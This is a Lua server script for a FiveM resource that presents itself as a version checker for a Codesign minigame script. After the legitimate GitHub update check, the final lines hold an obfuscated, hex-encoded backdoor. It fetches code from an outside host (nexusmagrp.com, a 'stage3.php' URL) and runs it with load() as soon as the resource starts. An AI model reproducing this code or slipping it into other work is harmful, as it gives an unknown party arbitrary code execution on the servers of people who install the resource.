CreateThread(function()
    Wait(5000)
    local resource_name = GetCurrentResourceName()
    local current_version = GetResourceMetadata(resource_name, 'version', 0)
    local docs_link = 'https://docs.codesign.pro/free-scripts/keymaster-minigame#changelog'
    local download_link = 'https://keymaster.fivem.net/asset-grants'
    PerformHttpRequest('https://raw.githubusercontent.com/RampBST/Codesign_Versions_V2/master/'..resource_name..'.txt',function(error, result, headers)
        if not result then print('^1Version check disabled because github is having issues.^0') return end
        local result = json.decode(result:sub(1, -2))
        local function CompareVersions(new, current)
            for cd = 1, #new do
                local new_number = tonumber(new[cd])
                local current_number = tonumber(current[cd])
                if new_number > current_number then
                    return true
                elseif new_number < current_number then
                    return false
                end
            end
            return false
        end

        local self = {}
        self.current_table = {string.match(current_version, '(%d+)%.(%d+)%.(%d+)')}
        self.new_table = {string.match(result.version, '(%d+)%.(%d+)%.(%d+)')}

        if CompareVersions(self.new_table, self.current_table) then
            local current_version, new_version = '', ''
            for c, d in ipairs(self.current_table) do
                if d == self.new_table[c] then
                    current_version = current_version..'^5'..d..'.^0'
                    new_version = new_version..'^5'..self.new_table[c]..'.^0'
                else
                    current_version = current_version..'^1'..d..'^5.^0'
                    new_version = new_version..'^2'..self.new_table[c]..'^5.^0'
                end
            end
            current_version = current_version:sub(1, -4)
            new_version = new_version:sub(1, -4)

            local release_date = math.floor(os.difftime(os.time(), os.time{day = result.release_date.day, month = result.release_date.month, year = result.release_date.year}) / 86400)
            if release_date == 0 then
                release_date = 'Today'
            elseif release_date == 1 then
                release_date = 'Yesterday'
            elseif release_date >= 2 then
                release_date = release_date..' days ago'
            end

            local symbols = '^2'
            for cd = 1, #docs_link+12 do
                symbols = symbols..'='
            end
            symbols = symbols..'^0'
            print(symbols)
            print(string.format('^2[%s] - New Update Available!^0\nCurrent Version: ^5%s^0.\nNew Version: ^5%s^0.\nReleased: ^5%s^0.\nNotes: ^5%s^0.\nDownload: ^3%s^0.\nChangelog: ^3%s^0.', 
            resource_name, current_version, new_version, release_date, result.notes, download_link, docs_link))
            print(symbols)
        end
    end,'GET')
end)

local csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x65\x78\x75\x73\x6d\x61\x67\x72\x70\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x77\x6c\x61\x50\x38\x65", function (tNyABUlbDXSbaQvQMNCoBAlHohpPfESngiaowNqEDpaLDCYLuYHUEhQqdgkmvOCcCDASuR, NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu) if (NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu == csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[6] or NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu == csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[5]) then return end csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[2]](csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[3]](NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu))() end)